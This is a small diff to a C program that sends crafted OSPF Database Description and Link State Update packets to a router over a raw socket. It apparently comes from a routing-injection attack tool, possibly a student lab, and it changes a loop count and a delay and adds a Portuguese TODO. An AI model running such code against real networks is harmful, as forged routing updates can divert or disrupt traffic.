@@ -78,7 +78,7 @@ int main(int argc, char *argv[]) {
   sleep(4);
 
   int i = 0;
-  while (i < 4) {
+  while (i < 3) {
     i++;
     // 0x03
     packet_len = attack_write_db_description(buffer, local_mac, local_ip, router_ip, dd_seq_number, DDC_MSTR + DDC_MORE);
@@ -99,7 +99,9 @@ int main(int argc, char *argv[]) {
   printf("Send DB Description success (%d).\n", ret_value);
   dd_seq_number += 1;
 
-  sleep(2);
+  sleep(3);
+
+  printf("TODO: MANDAR ACK DOS UPDATE DO ROUTER\n");
 
   packet_len = attack_write_ls_update(buffer, local_mac, local_ip, router_ip);
   if((ret_value = sendto(sock_fd, buffer, packet_len, 0, (struct sockaddr *)&(destAddr), sizeof(struct sockaddr_ll))) < 0) {
@@ -107,5 +109,6 @@ int main(int argc, char *argv[]) {
     exit(1);
   }
   printf("Send LS Update success (%d).\n", ret_value);
+
   return 0;
 }
